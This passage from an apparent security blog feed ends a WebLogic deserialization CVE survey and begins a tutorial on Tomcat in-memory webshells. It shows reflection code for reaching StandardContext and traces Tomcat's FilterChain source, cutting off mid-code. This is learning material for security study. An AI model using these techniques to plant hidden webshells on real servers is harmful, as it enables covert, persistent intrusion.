<li>URLClassLoader抛出异常</li>
<li>中间件</li>
<li>写文件css、js</li>
<li>dnslog</li>
</ol>
<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><ol>
<li>只有实现了Serializable接口或Externalizable接口的类才能进行序列化</li>
<li>被transient和static修饰的变量不参与修饰符，其值为null</li>
<li>readResolve()方法如果被定义会在readObject()方法后被调用，修改反序列化的对象</li>
<li>Externalizable接口定义了writeExternal()和readExternal()方法，对应Serializable接口的writeObject()和readObject()方法</li>
<li>历史漏洞梳理，大部分新漏洞的造成都是对黑名单的绕过：<ul>
<li>CVE-2015-4852、CVE2016-0638、CVE-2016-3510、CVE-2019-2890都是直接搜索能对ObjectInputStream直接进行操作的readObject()或者readExternal()方法</li>
<li>CVE-2017-3248、CVE-2018-2628、CVE-2018-2893、CVE-2018-3245主要在RMI的前提下不断搜索RemoteObject相似子类来绕过，或者是直接绕过resolveProxyClass()的检查</li>
<li>CVE-2020-2551运用T3协议和IIOP协议之间的差异进行绕过，关键的地方就是T3的resolveClass()方法会检查其父类，而IIOP的resolveClass()只会检查其本身类</li>
<li>CVE-2020-2555、CVE-2020-2883、CVE-2020-14645挖掘出了一条新的extractor反射链并不断搜索能够调用此方法的相似类进行绕过</li>
<li>CVE-2020-14644通过defineClass()来加载我们的恶意类，这是一个很巧妙的思路</li>
<li>CVE-2017-3506、CVE-2017-10271、CVE-2019-2725、CVE-2019-2729是根据对标签的差异解析进行绕过，这需要对源码进行深入解读才可以</li>
</ul>
</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/TheTh1nk3r/articles/14506947.html">java反序列化漏洞（1）之反射机制</a></p>
<p><a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/">Java反序列 Jdk7u21 Payload 学习笔记</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1516342">Weblogic反序列化历史漏洞全汇总</a></p>
<p><a href="https://www.anquanke.com/post/id/219985">CVE-2015-4852——WebLogic反序列化初探</a></p>
<p><a href="https://xz.aliyun.com/t/8443">从Weblogic原理上探究CVE-2015-4852、CVE-2016-0638、CVE-2016-3510究竟怎么一回事</a></p>
<p><a href="https://www.freebuf.com/column/203816.html">CVE-2017–10271漏洞原理分析</a></p>
<p><a href="https://www.cnblogs.com/afanti/p/10222293.html">weblogic远程调试XMLDecoder RCE CVE-2017-10271</a></p>
<p><a href="http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/">CVE-2019-2725分析</a></p>
<p><a href="http://galaxylab.pingan.com.cn/weblogic-cve-2019-2725%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">WebLogic | CVE-2019-2725反序列化漏洞分析</a></p>
<p><a href="https://www.anquanke.com/post/id/225137#h3-5">CVE-2017-3248——WebLogic反序列化初探</a></p>
<p><a href="https://xz.aliyun.com/t/8073">CVE-2018-2628 Weblogic反序列化漏洞分析</a></p>
<p><a href="https://www.anquanke.com/post/id/152164">CVE-2018-2893：Oracle WebLogic Server 远程代码执行漏洞分析预警</a></p>
<p><a href="https://xz.aliyun.com/t/2479">Weblogic JRMP反序列化漏洞回顾</a></p>
<p><a href="https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2019-2729 WEBLOGIC XMLDECODER反序列化漏洞分析</a></p>
<p><a href="https://xz.aliyun.com/t/6904">Weblogic-T3-CVE-2019-2890-Analysis</a></p>
<p><a href="https://paper.seebug.org/1321/#cve-2020-2555">Weblogic12c T3 协议安全漫谈</a></p>
<p><a href="https://www.anquanke.com/post/id/213074">Weblogic 远程命令执行漏洞（CVE-2020-14644）分析</a></p>
<p><a href="https://www.anquanke.com/post/id/213248">Weblogic 远程命令执行漏洞（CVE-2020-14645）分析</a></p>
<p><a href="https://xz.aliyun.com/t/7422">CVE-2020-2551: Weblogic IIOP反序列化漏洞分析</a></p>
<p><a href="https://www.anquanke.com/post/id/221752">CVE-2020-14882：Weblogic Console 权限绕过深入解析</a></p>
<p><a href="https://f5.pm/go-60295.html">Weblogic Console漏洞分析</a></p>
]]></content>
      <tags>
        <tag>WebLogic</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat内存马</title>
    <url>/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<blockquote>
<p>浅析Tomcat内存马</p>
</blockquote>
<span id="more"></span>

<h2 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h2><h3 id="初始化流程"><a href="#初始化流程" class="headerlink" title="初始化流程"></a>初始化流程</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419010d17901dd228b3521a27.png" alt="image-20211202025149726" style="zoom:80%;" />

<ol>
<li>部署描述文件中由<code>&lt;listener&gt;</code>元素标记的事件监听器会被创建和初始化，事件监听器如果实现了<code>ServletContextListener</code>接口，将会调用其实现的<code>contextInitialized()</code>方法</li>
<li>部署描述文件中由<code>&lt;filter&gt;</code>元素标记的过滤器会被创建和初始化，并调用其<code>init()</code>方法，每一次请求时都只调用<code>doFilter()</code>方法进行处理</li>
<li>部署描述文件中由<code>&lt;servlet&gt;</code>元素标记的<code>Servlet</code>会根据<code>&lt;load-on-startup&gt;</code>的权值按顺序创建和初始化，并调用其<code>init()</code>方法，<code>Servlet</code>一旦被装入到Web容器之后，一般会长久驻留，直到Web容器停止运行或重新装入<code>Servlet</code>时结束生命周期，<code>Servlet</code>在第一次访问之后都只调用<code>doGet()</code>或<code>doPost()</code>方法</li>
</ol>
<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><h3 id="Tomcat体系结构"><a href="#Tomcat体系结构" class="headerlink" title="Tomcat体系结构"></a>Tomcat体系结构</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202112041900df05d576da5041783ccd.png" alt="image-20211201195720058" style="zoom: 50%;" />

<ul>
<li><strong>Server</strong>：表示一个Tomcat实例（单例），即整个catalina servlet容器，主要是用来管理容器下各个Serivce组件的生命周期</li>
<li><strong>Service</strong>：一组提供服务、处理请求的组件，将一组Connector组件和Engine关联了起来</li>
<li><strong>Connector</strong>：客户端连接到Tomcat容器的服务点，它为Engine提供协议服务，并根据Engine与客户端通讯的协议类型进行隔离，如HTTP、HTTPS、AJP协议</li>
<li><strong>Container</strong>：Container是容器的父接口，用于封装和管理Servlet，以及处理Request请求，它包含了四大请求处理组件：Engine、Host、Context和Wrapper</li>
<li><strong>Engine</strong>：Service中的请求处理组件，包含了Servlet容器的核心功能，主要负责将传入请求委托给适当的Host处理</li>
<li><strong>Host</strong>：虚拟主机，每个Host会与某个网络域名相匹配，负责运行多个Web Application，每个Web Application对应一个Context，负责将收到的请求匹配到对应的Context，匹配的方法为“最长匹配”</li>
<li><strong>Context</strong>：一个Contenxt代表一个Web Application，具备了Servlet运行的基本环境</li>
<li><strong>Wrapper</strong>：最底层的容器，一个Wrapper代表一个Servlet，负责Servlet的装载、初始化、执行和资源回收</li>
</ul>
<h3 id="Tomcat组件关系"><a href="#Tomcat组件关系" class="headerlink" title="Tomcat组件关系"></a>Tomcat组件关系</h3><ul>
<li>一个Server包含一个或多个Service</li>
<li>一个Service包含多个Connector和一个Container</li>
<li>一个Container只能包含一个Engine</li>
<li>一个Engine包含一个或多个Host</li>
<li>一个Host包含一个或多个Web Application</li>
<li>一个Context表示一个运行着Tomcat实例的Web Application</li>
<li>一个Web Application包含一个或多个Wrapper</li>
<li>一个Wrapper表示一个Servlet</li>
<li>Engine、Host、Context和Wrapper是显现了Container接口的容器</li>
</ul>
<h3 id="Tomcat执行流程"><a href="#Tomcat执行流程" class="headerlink" title="Tomcat执行流程"></a>Tomcat执行流程</h3><p><strong>客户端和服务端交互过程</strong></p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20211204190156f5ecc16735b1e97e53.png" alt="image-20211201195745765" style="zoom:50%;" />

<p><strong>请求数据流图</strong></p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202112041901cc740176246a7b512a0c.png" alt="image-20211201204202339" style="zoom: 67%;" />

<p><strong>Pipeline调用链</strong></p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2022022514188f36aeccd50ffad408c1.png" alt="image-20211202153946928" style="zoom:50%;" />

<ul>
<li><code>Connector</code>在某个指定的端口上来监听客户端发来的请求</li>
<li><code>Connector</code>使用<code>ProtocolHandler</code>处理器处理收到的请求，<code>ProtocolHandler</code>处理器共有三个组件<ul>
<li><code>Endpoint</code>负责接受，处理<code>socket</code>网络连接（<code>Executor</code>提供多线程操作）</li>
<li><code>Processor</code>根据协议类型封装成<code>Request</code></li>
<li><code>Adapter</code>负责将封装好的<code>Request</code>交给<code>Container</code>进行处理</li>
</ul>
</li>
<li><code>Container</code>使用<code>Pipeline-valve</code>管道处理请求，每个 <code>Pipeline</code> 都有一个最后执行的、不可删除的 <code>BasicValve</code>，通常命名为<code>Standard(xxx)Valve</code>，如上图所示，上层容器<code>valve</code>调用下层<code>valve</code>形成链式结构<ul>
<li><code>EnginePipeline</code>：<code>EngineValve1</code> -&gt; … -&gt;<code>StandardEngineValve</code></li>
<li><code>HostPipeline</code>：<code>HostValve1</code> -&gt; … -&gt;<code>StandardHostValve</code></li>
<li><code>ContextPipeline</code>：<code>ContextValve1</code> -&gt; … -&gt;<code>StandardContextValve</code></li>
<li><code>WrapperPipeline</code>：<code>WrapperValve1</code> -&gt; … -&gt;<code>StandardWrapperValve</code></li>
</ul>
</li>
<li>创建<code>FilterChain</code>，如果一个<code>URL</code>对应多个<code>Filter</code>则进行链式调用</li>
<li>最终由<code>Servlet</code>处理请求，并将处理的结果返回给<code>Connector</code></li>
<li><code>Connector</code>把响应回传给客户端</li>
</ul>
<h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p><code>StandardContext</code>是<code>Context</code>的实现类，涵盖了<code>Web Application</code>的启动流程，包括使用<code>WebResourceRoot</code>加载资源文件、利用<code>Loader</code>加载<code>class</code>，使用<code>JarScanner</code>扫描，实例化<code>Sesssion</code>管理器，初始化各种<code>Listener</code>、<code>Filter</code>和<code>Servlet</code>等功能</p>
<p>以下讲到的内存马都是基于修改<code>StandardContext</code>实现的，所以如何获取<code>StandardContext</code>也是内存马实现的重点之一</p>
<p><strong>获取方法</strong></p>
<p>目前<code>StandardContext</code>获取的方式有以下几种：</p>
<ol>
<li><p>从<code>request</code>对象反射出<code>ApplicationContext</code>，再反射出<code>StandardContext</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>
</li>
<li><p>从<code>ThreadLocal</code>中获取<code>request</code></p>
<blockquote>
<p>Tomcat 7、8、9</p>
</blockquote>
<p>参考**@threedr3am**师傅的<a href="https://xz.aliyun.com/t/7388">文章</a></p>
</li>
<li><p>从<code>ContextClassLoader</code>中获取</p>
<blockquote>
<p>Tomcat 8、9</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历<code>thread</code>数组获取包含<code>StandardContext</code>的类，其中<code>Acceptor</code>为全版本<code>tomcat</code>都有</p>
<blockquote>
<p>Tomcat 6、7、8、9</p>
</blockquote>
<p>参考**@bitterz**师傅的<a href="https://xz.aliyun.com/t/9914">文章</a>，比如下面方法就能够拿到<code>/manager</code>下的<code>StandardContext</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread[] threads = (Thread[]) <span class="built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line"></span><br><span class="line">threads[<span class="number">3</span>] ==&gt; Thread[ContainerBackgroundProcessor[StandardEngine[Catalina]],<span class="number">5</span>,main]</span><br><span class="line"></span><br><span class="line">threads[<span class="number">3</span>].target.<span class="built_in">this</span>$<span class="number">0.</span>children.values.toArray()[<span class="number">0</span>].children.get(<span class="string">&quot;/manager&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h3><h4 id="FilterChain"><a href="#FilterChain" class="headerlink" title="FilterChain"></a>FilterChain</h4><p>前面提到，当<code>StandardWrapperValve</code>执行完后就会创建<code>FilterChain</code>，所以<code>FilterChain</code>的入口位于<code>org/apache/catalina/core/StandardWrapperValve.java#invoke</code>函数中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">StandardWrapperValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">        <span class="type">MessageBytes</span> <span class="variable">requestPathMB</span> <span class="operator">=</span> request.getRequestPathMB();</span><br><span class="line">        <span class="type">DispatcherType</span> <span class="variable">dispatcherType</span> <span class="operator">=</span> DispatcherType.REQUEST;</span><br><span class="line">        <span class="keyword">if</span> (request.getDispatcherType()==DispatcherType.ASYNC) dispatcherType = DispatcherType.ASYNC;</span><br><span class="line">        request.setAttribute(Globals.DISPATCHER_TYPE_ATTR,dispatcherType);</span><br><span class="line">        request.setAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR,</span><br><span class="line">                requestPathMB);</span><br><span class="line">        <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span></span><br><span class="line">                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet); <span class="comment">// ==&gt; 创建FilterChain</span></span><br><span class="line"></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ApplicationFilterFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">            Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (servlet == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">            <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) request;</span><br><span class="line">            <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                filterChain = (ApplicationFilterChain) req.getFilterChain(); <span class="comment">// ==&gt; 初始化一个空的FilterChain</span></span><br><span class="line">                <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">                    filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">                    req.setFilterChain(filterChain);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.setServlet(servlet); <span class="comment">// ==&gt; 设置Servlet</span></span><br><span class="line">        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"></span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) wrapper.getParent(); <span class="comment">// ==&gt; 获取StandardContext</span></span><br><span class="line">        FilterMap filterMaps[] = context.findFilterMaps(); <span class="comment">// ==&gt; 获取存储了所有filter的filterMaps，filterMaps位于StandardContext的filterMaps属性中</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((filterMaps == <span class="literal">null</span>) || (filterMaps.length == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">return</span> filterChain;</span><br><span class="line"></span><br><span class="line">        <span class="type">DispatcherType</span> <span class="variable">dispatcher</span> <span class="operator">=</span></span><br><span class="line">                (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR); <span class="comment">// ==&gt; 获取调度类型为&quot;REQUEST&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">requestPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">attribute</span> <span class="operator">=</span> request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);</span><br><span class="line">        <span class="keyword">if</span> (attribute != <span class="literal">null</span>)&#123;</span><br><span class="line">            requestPath = attribute.toString(); <span class="comment">// ==&gt; 获取请求的URL路径</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName(); <span class="comment">// ==&gt; 获取Servlet的名字</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123; <span class="comment">// ==&gt; 匹配调度的指令，即&quot;REQUEST&quot;</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!matchFiltersURL(filterMap, requestPath)) <span class="comment">// ==&gt; 根据Filter的URLPattern匹配请求的URL</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName()); <span class="comment">// ==&gt; 初始化filterConfig，此处的filterDef封装了我们的Filter，filterConfigs以键值对的方式存储在StandardContext中</span></span><br><span class="line">            <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.addFilter(filterConfig); <span class="comment">// ==&gt; 添加filterConfig到filterChain的filters数组中</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!matchFiltersServlet(filterMap, servletName)) <span class="comment">// ==&gt; 匹配ServletName，但是filterMap默认的ServletName为空，所以全部跳过</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">            <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> filterChain; <span class="comment">// ==&gt; 返回FilterChain</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再次回到<code>StandardWrapperValve</code>的<code>invoke()</code>函数中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">StandardWrapperValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">        <span class="type">MessageBytes</span> <span class="variable">requestPathMB</span> <span class="operator">=</span> request.getRequestPathMB();</span><br><span class="line">        <span class="type">DispatcherType</span> <span class="variable">dispatcherType</span> <span class="operator">=</span> DispatcherType.REQUEST;</span><br><span class="line">        <span class="keyword">if</span> (request.getDispatcherType()==DispatcherType.ASYNC) dispatcherType = DispatcherType.ASYNC;</span><br><span class="line">        request.setAttribute(Globals.DISPATCHER_TYPE_ATTR,dispatcherType);</span><br><span class="line">        request.setAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR,</span><br><span class="line">                requestPathMB);</span><br><span class="line">        <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span></span><br><span class="line">                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet); <span class="comment">// ==&gt; 创建FilterChain</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((servlet != <span class="literal">null</span>) &amp;&amp; (filterChain != <span class="literal">null</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (context.getSwallowOutput()) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        SystemLogHandler.startCapture();</span><br><span class="line">                        <span class="keyword">if</span> (request.isAsyncDispatching()) &#123;</span><br><span class="line">                            request.getAsyncContextInternal().doInternalDispatch();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            filterChain.doFilter(request.getRequest(),</span><br><span class="line">                                    response.getResponse());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">log</span> <span class="operator">=</span> SystemLogHandler.stopCapture();</span><br><span class="line">                        <span class="keyword">if</span> (log != <span class="literal">null</span> &amp;&amp; log.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            context.getLogger().info(log);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (request.isAsyncDispatching()) &#123;</span><br><span class="line">                        request.getAsyncContextInternal().doInternalDispatch();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        filterChain.doFilter</span><br><span class="line">                            (request.getRequest(), response.getResponse()); <span class="comment">// ==&gt; 调用ApplicationFilterChain的doFilter()函数</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ApplicationFilterChain</span> <span class="keyword">implements</span> <span class="title class_">FilterChain</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.AccessController.doPrivileged(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">                            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                            internalDoFilter(req,res);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                );</span><br><span class="line">            &#125; <span class="keyword">catch</span>( PrivilegedActionException pe) &#123;</span><br><span class="line">                <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> pe.getException();</span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> ServletException)</span><br><span class="line">                    <span class="keyword">throw</span> (ServletException) e;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> IOException)</span><br><span class="line">                    <span class="keyword">throw</span> (IOException) e;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RuntimeException)</span><br><span class="line">                    <span class="keyword">throw</span> (RuntimeException) e;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(e.getMessage(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            internalDoFilter(request,response); <span class="comment">// ==&gt; 调用internalDoFilter函数()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ApplicationFilterChain</span> <span class="keyword">implements</span> <span class="title class_">FilterChain</span> &#123;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">                                  ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123; <span class="comment">// ==&gt; 遍历FilterChains</span></span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> filters[pos++];</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> filterConfig.getFilter(); <span class="comment">// ==&gt; 获取对应的Filter</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="string">&quot;false&quot;</span>.equalsIgnoreCase(</span><br><span class="line">                        filterConfig.getFilterDef().getAsyncSupported())) &#123;</span><br><span class="line">                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">                    <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span></span><br><span class="line">                        ((HttpServletRequest) 